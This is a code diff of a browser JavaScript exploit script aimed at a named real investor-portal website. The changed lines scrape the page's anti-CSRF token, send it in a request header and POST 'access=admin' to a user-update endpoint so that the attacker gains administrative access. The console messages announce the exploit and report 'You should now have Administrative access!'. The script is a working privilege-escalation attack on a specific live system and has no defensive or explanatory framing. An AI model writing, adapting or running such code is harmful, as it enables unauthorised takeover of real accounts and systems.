@@ -1,11 +1,9 @@
 //BEGIN
 console.log("Initiating exploit...");
-//console.log("GET URL is: " + GET_URL);
-//console.log("might need to put the entire https:// URL here if this fails..");
 
-var priveEscTarget = "https://investorportal.ispt.net.au/my-profile"; //be sure to change this when making POST
+var priveEscTarget = "https://investorportal.ispt.net.au/user/updateField/1559";
 console.log("Targetting: " + priveEscTarget);
-
+console.log(" ");
 console.log("Reading response to extract anti-CSRF token...");
 var extract = document.querySelector('input[name=_token]').value;
 console.log("Token extracted successfully: " + extract);
@@ -15,26 +13,17 @@ function bypassCSRF() {
   console.log("Instantiating XMLHttpRequest...");
   //instantiating XMLHttpRequest
   var poc = new XMLHttpRequest();
-  console.log("Assigning payload...");
-  poc.open("GET", priveEscTarget); //need to add the POST CSRF req here associtaed with user role access, with http post body data included.
-  console.log("Parsing token to XHR to bypass CSRF protection mechanism...");
+  console.log("Parsing token to XHR to bypass CSRF protection and assigning payload...");
+  poc.open("POST", priveEscTarget); 
   poc.setRequestHeader("X-CSRF-TOKEN", extract);
-  console.log("Firing exploit...");
-  //below is for debugging, can be deleted
-  console.log("Debugging if X-CSRF-TOKEN header is submitted: ");
-  var headers = poc.getAllResponseHeaders();
-  console.log(headers);
-  // end of debugging
-  poc.send();
+  var fd = new FormData();
+  fd.append('access', 'admin');
+  poc.send(fd);
+  console.log("CSRF request sent with header");
+  console.log(" ");
   console.log("Exploit completed! You should now have Administrative access!");
   console.log(" ");
 }
 
-//readToken();
 bypassCSRF();
-
-//console.log("Done! Verify extracted token value is correct, if so; write xhr function to fire the privesc");
-//var GET_URL="https://investorportal.ispt.net.au/my-profile";
-//getTokenJS();
-console.log("end of exploit");
 //EOF
